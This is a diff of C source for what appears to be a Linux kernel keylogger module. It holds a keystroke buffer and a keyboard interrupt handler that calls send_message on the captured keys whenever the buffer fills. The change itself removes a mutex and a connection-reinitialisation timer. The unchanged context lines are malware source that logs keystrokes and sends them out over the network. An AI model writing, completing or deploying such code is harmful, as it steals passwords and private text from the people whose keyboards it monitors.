@@ -5,19 +5,12 @@
 #include <linux/irq.h>
 #include <linux/interrupt.h>
 #include <linux/delay.h>
-#include <linux/mutex.h>
 
 #include "networking.h"
 #include "keyboardLogger.h"
 
 // Keyboard stroke buffer
 static char keystrokes[KEY_BUFFER_SIZE + 1] = ""; 
-
-// Timer to reinitialize connection
-struct timer_list connection_timer;
-
-// Mutex between sock refreshment and other resources.
-struct mutex socks_mutex;
 
 // Keyboard interrupt handler
 irqreturn_t keyboard_interrupt_handler(int irq, void *dev_id) {
@@ -36,7 +29,6 @@ irqreturn_t keyboard_interrupt_handler(int irq, void *dev_id) {
 
         if (buffer_count == 0) {
             send_message(keystrokes);
-            mod_timer(&connection_timer, jiffies + msecs_to_jiffies(1000));
         }
     }
 
